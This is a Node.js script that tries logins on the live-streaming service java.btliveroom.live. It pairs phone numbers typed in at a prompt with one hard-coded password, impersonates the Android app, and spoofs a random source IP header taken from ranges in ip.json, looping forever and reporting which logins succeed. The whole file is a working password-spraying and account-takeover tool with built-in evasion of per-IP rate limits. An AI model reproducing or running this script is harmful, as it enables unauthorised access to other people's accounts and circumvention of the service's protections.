const fetch = require('node-fetch')
const readline = require('readline-sync');
const fs = require('fs-extra');
const getIPRange = require('get-ip-range');

const functionLogin = (randIp, nomor, password) => new Promise((resolve, reject) => {
    const bodys = {
        "user_login": `62${nomor}`,
        "user_pass": password
    }

    fetch(`https://java.btliveroom.live/auth/v1.0/login`, { 
        method: 'POST', 
        body: JSON.stringify(bodys),
        headers: {
            'source': 'android',
            'user-agent': 'Dart/2.18 (dart:io)',
            'ip': randIp,
            'accept-encoding': 'gzip',
            'currency': 'Rp',
            'content-type': 'application/json; charset=utf-8',
            'tenant': '1001',
            'time-zone': 'GMT+7',
            'country': 'idn',
            'accept': 'application/json',
            'region': '',
            'content-length': 53,
            'v': '1.0.0',
            'host': 'java.btliveroom.live',
            'l': 'in'
        }
   })
   .then(res => res.json())
   .then(result => {
       resolve(result);
   })
   .catch(err => reject(err))
});

(async () => {
    while(true){
        try {
            const nomor = readline.question('NO HP (ex: 819088XXXX): ')
            const password = 'jajang908'
          
            const listIp = await JSON.parse(fs.readFileSync('./ip.json'))  
            const chooseIp = listIp[Math.floor(Math.random()*listIp.length)]
            const start = chooseIp.start
            const end = chooseIp.end
            const genIp = getIPRange(`${start}`, `${end}`);
            const randIp = genIp[Math.floor(Math.random()*genIp.length)]
    
            console.log(`Mencoba login ${nomor}|${password} => IP address ${randIp}`)
    
            const login = await functionLogin(randIp, nomor, password)
            if(login.code == 200){
                console.log(`Login sukses | ID => ${login.data.user_info.id}`)
            } else {
                console.log(`Login gagal, ${login.message}`)
            }
            console.log("")
        } catch (error) {
            console.log(error);
        }
    }
})();
